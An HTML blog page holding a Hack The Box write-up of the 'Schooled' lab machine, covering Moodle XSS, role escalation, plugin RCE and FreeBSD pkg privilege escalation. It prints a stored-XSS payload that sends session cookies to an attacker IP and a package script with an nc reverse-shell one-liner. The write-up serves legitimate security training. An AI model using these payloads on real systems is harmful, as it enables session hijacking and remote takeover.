@@ -1,0 +1,647 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               Hack The Box - Schooled &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="Hack The Box - Schooled - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="Hack The Box - Schooled">
+    <meta itemprop="description" content="Hack The Box - Schooled - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="Hack The Box - Schooled">
+    <meta property="og:description" content="Hack The Box - Schooled - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/article/schooled/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/article/schooled/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/article/schooled/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/" class="active">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/article/schooled/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/article/schooled/">
+            Hack The Box - Schooled
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2022-01-01</span>
+            
+        
+
+        
+            
+                <span class="readingTime">8 min read</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/htb/">HTB</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/writeup/">writeup</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/freebsd/">freebsd</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/schooled/sch-fiche.png" alt=""></p>
+<p>Schooled is a medium <a href="https://app.hackthebox.eu/machines/schooled">machine</a> that was deployed on Hack The Box on Saturday, 3 april 2021 and created by <strong>TheCyberGeek</strong>.</p>
+<h1 id="quick-summary">Quick summary</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#nmap-scan">Nmap scan</a></li>
+        <li><a href="#web-enumeration">Web enumeration</a>
+          <ul>
+            <li><a href="#moodle">Moodle</a></li>
+            <li><a href="#student-to-teacher">Student to teacher</a></li>
+            <li><a href="#teacher-to-manager">Teacher to manager</a></li>
+          </ul>
+        </li>
+        <li><a href="#foothold---www">Foothold - www</a></li>
+        <li><a href="#lateral-movement---jamie">Lateral movement - jamie</a></li>
+        <li><a href="#privesc---root">PrivEsc - root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap-scan">Nmap scan</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9 <span style="color:#f92672">(</span>FreeBSD 20200214; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.46 <span style="color:#f92672">((</span>FreeBSD<span style="color:#f92672">)</span> PHP/7.4.15<span style="color:#f92672">)</span>
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>FreeBSD<span style="color:#f92672">)</span> PHP/7.4.15
+|_http-title: Schooled - A new kind of educational institute
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+</code></pre></div><p>We find:</p>
+<ul>
+<li>22/tcp - <strong>SSH</strong></li>
+<li>80/tcp - <strong>HTTP</strong></li>
+<li>freebsd OS</li>
+</ul>
+<p>A full scan on all ports reveals the presence of an additional port</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+33060/tcp open  mysqlx
+</code></pre></div><ul>
+<li>33060/tcp - <strong>mysqlx</strong></li>
+</ul>
+<h3 id="web-enumeration">Web enumeration</h3>
+<p>When I connect to the website on port <code>80</code>, I come across an e-learning site with four tabs in the header:</p>
+<ul>
+<li>Home</li>
+<li>About us</li>
+<li>Teachers</li>
+<li>Contact</li>
+</ul>
+<p><img src="/img/schooled/sch-site.png" alt=""></p>
+<p>The first two tabs <code>Home</code> and <code>About us</code> represent the main page, nothing special in the source code. On the other hand, at the bottom of the page, we find the testimonies of several customers who could be potential users for the future.</p>
+<p><img src="/img/schooled/sch-tem.png" alt=""></p>
+<ul>
+<li>James Fernando</li>
+<li>Jacques Philips</li>
+<li>Venanda Mercy</li>
+</ul>
+<p>The <code>Teachers</code> tab presents the teachers of the platform who can also be users. When you move the mouse over them you have the possibility to go to their (fictitious) social networks like Facebook, Twitter or Linkedin.</p>
+<p><img src="/img/schooled/sch-teach.png" alt=""></p>
+<p>Finally, the <code>Contact</code> tab gives us the possibility to contact them and an error message draws my attention</p>
+<p><img src="/img/schooled/sch-con.png" alt=""></p>
+<p>In the footer, you can find details like the address located in Australia, the email, their phone number and the domain <code>schooled.htb</code>.</p>
+<p><img src="/img/schooled/sch-foot.png" alt=""></p>
+<p>I didn&rsquo;t find anything with the directory fuzzing so I decide to do a subdomain fuzzing.</p>
+<p><img src="/img/schooled/sch-mood.png" alt=""></p>
+<p>We find the subdomain <code>moodle.schooled.htb</code>, I add it in <code>/etc/hosts</code> and go there.</p>
+<h4 id="moodle">Moodle</h4>
+<p><img src="/img/schooled/sch-mood2.png" alt=""></p>
+<p><a href="https://en.wikipedia.org/wiki/Moodle">Moodle</a> is a free and open-source learning management system (LMS) written in PHP. Here you can find courses in mathematics, computer science, scientific research and English literature. You can also connect.</p>
+<p><img src="/img/schooled/sch-log.png" alt=""></p>
+<p>I can log in as a guest or create a new account. As a guest, I have access to the platform, but not to the content.</p>
+<p><img src="/img/schooled/sch-inv.png" alt=""></p>
+<p>Created a new account making sure to put <code>student.schooled.htb</code> and I am redirected to the platform.</p>
+<p><img src="/img/schooled/sch-newacc.png" alt=""></p>
+<p><img src="/img/schooled/sch-plat.png" alt=""></p>
+<p>You can only register for the mathematics course of the teacher <code>Manuel Phillips</code>. After registering, there are two announcements:</p>
+<ul>
+<li>Reminder for joining students</li>
+<li>Welcome to Mathematics</li>
+</ul>
+<p>The second one is not interesting, but the first one is.</p>
+<p><img src="/img/schooled/sch-announce.png" alt=""></p>
+<p><img src="/img/schooled/sch-announce2.png" alt=""></p>
+<p>In order to attend the mathematics class, you must fill in the <code>MoodleNet profile</code> field in your profile on the site, otherwise you will be removed before the class starts. The teacher will check for each person. While searching for the moodle version, I come across this <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/moodle">link</a> which presents <code>moodlescan</code>, I clone the repo and launched it.</p>
+<p><img src="/img/schooled/sch-ver.png" alt=""></p>
+<p>It&rsquo;s the version <code>3.9.0-beta</code>, I start searching for exploits with the keywords <code>moodle exploit 3.9</code>. I find several vulnerabilities and after investigation this <a href="http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.145018">article</a> on <strong>CVE-2020-25627</strong>.</p>
+<blockquote>
+<p>The moodlenetprofile user profile field requires extra sanitizing to prevent a stored XSS risk.</p>
+</blockquote>
+<p>I try to reproduce the vulnerability by clicking on the <code>down arrow at the top right</code>, <code>Profile</code> and  <code>Edit Profile</code>, add the payload <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> and click on <code>Update Profile</code>.</p>
+<p><img src="/img/schooled/sch-test.png" alt=""></p>
+<p>It works! I get a <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a>.</p>
+<p><img src="/img/schooled/sch-xss.png" alt=""></p>
+<p>Googling for more information about this CVE, I find a POC on the <a href="https://github.com/HoangKien1020/CVE-2020-25627">repo</a> of <code>Kien Hoang</code>. Every time a user views my moodle profile, the <code>stored XSS</code> is triggered. I can put a script to steal the math teacher&rsquo;s session cookies as he clicks on each profile. If I look at my cookies on the site, there is one called <code>MoodleSession</code>.</p>
+<p><img src="/img/schooled/sch-sess.png" alt=""></p>
+<h4 id="student-to-teacher">Student to teacher</h4>
+<p>Add the payload in the <code>MoodleNet profile</code> field</p>
+<p><code>&lt;script&gt;var i=new Image;i.src=&quot;http://10.10.14.251/xss.php?&quot;+document.cookie;&lt;/script&gt;</code></p>
+<p><img src="/img/schooled/sch-hij.png" alt=""></p>
+<p>I sign up for the math class and open a listener on port <code>80</code></p>
+<p><img src="/img/schooled/sch-enroll2.png" alt=""></p>
+<p>After about 1 minute, I have an answer with the teacher&rsquo;s cookie</p>
+<p><img src="/img/schooled/sch-hij2.png" alt=""></p>
+<p>Replace my cookie with his and refresh the page</p>
+<p><img src="/img/schooled/sch-hij3.png" alt=""></p>
+<p>Now, I&rsquo;m logged in as <code>Manuel Phillips</code>, the session hijacking worked fine.</p>
+<h4 id="teacher-to-manager">Teacher to manager</h4>
+<p>After investigation, I couldn&rsquo;t find anything about the interface. Google searches led me to this <a href="https://www.youtube.com/watch?v=BkEInFI4oIU">video</a> which presents the <strong>CVE-2020-14321</strong> from A to Z, the goal is to go from teacher to manager in order to have access to administration panel to be able to install a vulnerable plugin to have an RCE.</p>
+<p>The first step is to add a manager to the math course, if we remember the web listing in the <code>Teachers</code> tab, we can see that the only manager is <code>Lianne Carter</code>, she&rsquo;s also an English teacher. If we go to the profile of <code>Manuel Phillips</code>, we can see that his ID is equal to <code>24</code>.</p>
+<p><img src="/img/schooled/sch-id.png" alt=""></p>
+<p>I go to the math course and in the <code>Participants</code> tab, click on <code>Enrol users</code>.</p>
+<p><img src="/img/schooled/sch-parti.png" alt=""></p>
+<p>I choose <code>Lianne Carter</code> and intercept the request with burp, then click on <code>Enrol users</code></p>
+<p><img src="/img/schooled/sch-lia.png" alt=""></p>
+<p>Get the query in burp and change the <code>userlist%5B%5D=</code> field to put the teacher&rsquo;s ID <code>24</code> and the <code>roletoassign=</code> field to <code>1</code> to get the manager role.</p>
+<p><img src="/img/schooled/sch-avt.png" alt=""></p>
+<p><img src="/img/schooled/sch-apr.png" alt=""></p>
+<p>I send the request by clicking on <code>Forward</code>. Now, we also have manager rights, the last step is to add a second time <code>Lianne Carter</code>. This way we can log into her account directly</p>
+<p><img src="/img/schooled/sch-man.png" alt=""></p>
+<p>If I click on his profile, I can now connect to the admin panel.</p>
+<p><img src="/img/schooled/sch-lia2.png" alt=""></p>
+<p>We are logged in as Lianne Carter and a new tab <code>Site administration</code> has appeared</p>
+<p><img src="/img/schooled/sch-pan.png" alt=""></p>
+<p>For the moment, I still can&rsquo;t install plugins, I go to <code>Users -&gt; Define roles -&gt; Manager -&gt; Edit</code>, scroll down to the bottom of the page and before clicking <code>Save changes</code>I intercept the request with burp.</p>
+<p><img src="/img/schooled/sch-burp.png" alt=""></p>
+<p>We can get the <a href="https://github.com/HoangKien1020/CVE-2020-14321">payload</a>, from HoangKien, the <code>Payload to full permissions</code> part. We copy all the content into burp from <code>&amp;return</code> and we <code>Forward</code>.</p>
+<p><img src="/img/schooled/sch-burp2.png" alt=""></p>
+<p>Now, you can install plugins</p>
+<p><img src="/img/schooled/sch-plu.png" alt=""></p>
+<p>I add the .zip file from the repo and click on <code>Install plugin the ZIP file</code>, then <code>Continue</code>.</p>
+<p><img src="/img/schooled/sch-rce.png" alt=""></p>
+<p>I can access the RCE by going to <code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=whoami</code>.</p>
+<p><img src="/img/schooled/sch-rce2.png" alt=""></p>
+<h3 id="foothold---www">Foothold - www</h3>
+<p>To have a access on the machine, I will replace the file <code>block_rce.php</code> by a PHP reverse shell, I upload the .zip file.</p>
+<p><img src="/img/schooled/sch-revshell.png" alt=""></p>
+<p><img src="/img/schooled/sch-zip.png" alt=""></p>
+<p>I open a listener on port <code>1337</code> and go to <code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php</code>.</p>
+<p><img src="/img/schooled/sch-exp.png" alt=""></p>
+<p>I get a shell as <code>www</code>.</p>
+<h3 id="lateral-movement---jamie">Lateral movement - jamie</h3>
+<p>Displaying the users with <code>/etc/passwd</code>, I find the user <code>steve</code> and <code>jamie</code>.</p>
+<p><img src="/img/schooled/sch-etc.png" alt=""></p>
+<p>When importing the plugin, we were able to get an overview of the location of the moodle files.</p>
+<p><img src="/img/schooled/sch-loca.png" alt=""></p>
+<p>In the <code>moodle</code> folder, there is a <code>config.php</code> file which contains the creds for the <code>moodle:PlaybookMaster2020</code> database.</p>
+<p><img src="/img/schooled/sch-db.png" alt=""></p>
+<p>The <code>mysql</code> command cannot be found, because it is not in the <code>$PATH</code>. Searching for the binary with the <code>find</code> command, I find it under <code>/usr/local/bin/mysql</code>.</p>
+<p><img src="/img/schooled/sch-mysql.png" alt=""></p>
+<p>You must see the absolute path, there are three databases:</p>
+<ul>
+<li>Database</li>
+<li>information_schema</li>
+<li>moodle</li>
+</ul>
+<p><img src="/img/schooled/sch-db2.png" alt=""></p>
+<p>There are a lot of tables, so I decide to do a grep on <code>user</code> and the table <code>mdl_user</code> looks interesting.</p>
+<p><img src="/img/schooled/sch-md1.png" alt=""></p>
+<p>By displaying all the columns of the table <code>mdl_user</code>, the display was very bad so I decided to filter by displaying only the columns <code>username, password, firstname, lastname</code> and we find the hash of the computer teacher <code>Jamie Borham</code>.</p>
+<p><img src="/img/schooled/sch-jamie.png" alt=""></p>
+<p>Using john to crack this hash, after two/three minutes we find the password <code>!QAZ2wsx</code>.</p>
+<p><img src="/img/schooled/sch-hash.png" alt=""></p>
+<p><code>jamie:!QAZ2wsx</code></p>
+<p>I try to connect in SSH and it works!</p>
+<p><img src="/img/schooled/sch-ssh.png" alt=""></p>
+<p>Retrieve the first flag <code>user.txt</code>. 😊</p>
+<p><img src="/img/schooled/sch-user.png" alt=""></p>
+<h3 id="privesc---root">PrivEsc - root</h3>
+<p>By doing <code>sudo -l</code>, I find two binaries that can be run with <code>root</code> privileges.</p>
+<p><img src="/img/schooled/sch-pkg.png" alt=""></p>
+<p><a href="https://www.freebsd.org/cgi/man.cgi?query=pkg&amp;sektion=7">pkg</a> is a package manager under freebsd like <code>apt</code>. While looking for a way to do an elevation of privilege with this binary, I came accross the <a href="https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1">blog</a> of <code>xct</code>.</p>
+<p><img src="/img/schooled/sch-xct.png" alt=""></p>
+<p>The method works and we get a shell as a <code>root</code>. But I will use the <a href="http://lastsummer.de/creating-custom-packages-on-freebsd/">article</a> in source to create a custom package to get a reverse shell. To do this, we replace the <code>usermod</code> command with an openBSD reverse shell that can be found on the <code>Swissky</code> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd">repo</a>.</p>
+<p>Creation of the file <code>luks.sh</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
+</span><span style="color:#75715e"></span>
+STAGEDIR<span style="color:#f92672">=</span>/tmp/package
+rm -rf <span style="color:#e6db74">${</span>STAGEDIR<span style="color:#e6db74">}</span>
+mkdir -p <span style="color:#e6db74">${</span>STAGEDIR<span style="color:#e6db74">}</span>
+
+cat &gt;&gt; <span style="color:#e6db74">${</span>STAGEDIR<span style="color:#e6db74">}</span>/+PRE_INSTALL <span style="color:#e6db74">&lt;&lt;EOF
+</span><span style="color:#e6db74"># careful here, this may clobber your system
+</span><span style="color:#e6db74">echo “Resetting root shell”
+</span><span style="color:#e6db74">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.251 1337 &gt;/tmp/f
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">EOF</span>
+cat &gt;&gt; <span style="color:#e6db74">${</span>STAGEDIR<span style="color:#e6db74">}</span>/+POST_INSTALL <span style="color:#e6db74">&lt;&lt;EOF
+</span><span style="color:#e6db74"># careful here, this may clobber your system
+</span><span style="color:#e6db74">echo “Registering root shell”
+</span><span style="color:#e6db74">pw usermod -n root -s /bin/sh
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">EOF</span>
+cat &gt;&gt; <span style="color:#e6db74">${</span>STAGEDIR<span style="color:#e6db74">}</span>/+MANIFEST <span style="color:#e6db74">&lt;&lt;EOF
+</span><span style="color:#e6db74">name: luks
+</span><span style="color:#e6db74">version: “1.0_5”
+</span><span style="color:#e6db74">origin: sysutils/luks
+</span><span style="color:#e6db74">comment: “automates stuff”
+</span><span style="color:#e6db74">desc: “automates tasks which can also be undone later”
+</span><span style="color:#e6db74">maintainer: luks@htb.com
+</span><span style="color:#e6db74">www: https://luksec.fr
+</span><span style="color:#e6db74">prefix: /
+</span><span style="color:#e6db74">EOF</span>
+
+pkg create -m <span style="color:#e6db74">${</span>STAGEDIR<span style="color:#e6db74">}</span>/ -r <span style="color:#e6db74">${</span>STAGEDIR<span style="color:#e6db74">}</span>/ -o .
+</code></pre></div><p>We assign rights to the file then we open a listener on port <code>1337</code>. Finally, we execute the following command found on <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFOBins</a>.</p>
+<p><code>sudo pkg install --no-repo-update ./luks-“1.0_5”.txz</code></p>
+<p>We are offered to accept or refuse, I click on <code>y</code> and we get a shell as <code>root</code>. Retrieving the last flag <code>root.txt</code>. 😊</p>
+<p><img src="/img/schooled/sch-root.png" alt=""></p>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/cve/">cve</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/php/">php</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/bash/">bash</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/xss/">xss</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/cms-exploit/">cms exploit</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/web-fuzzing/">web fuzzing</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/gtfobin/">GTFObin</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/rce/">rce</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+    <div class="languages">
+        <i class="fa fa-language"></i>
+        <div class="links">
+            
+                <a href="//luksec.fr/fr/article/schooled/">fr</a>
+            
+        </div>
+    </div>
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Latest posts</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/advuln/">Setting up a vulnerable AD environment</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/categories/"><strong>Categories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/categories/ctf">Ctf
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/htb">Htb
+                        (21)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/write-up">Write up
+                        (18)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/linux">Linux
+                        (15)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/writeup">Writeup
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Social media</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Other languages</strong>
+                
+                
+                <a href="//luksec.fr/" class="active">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
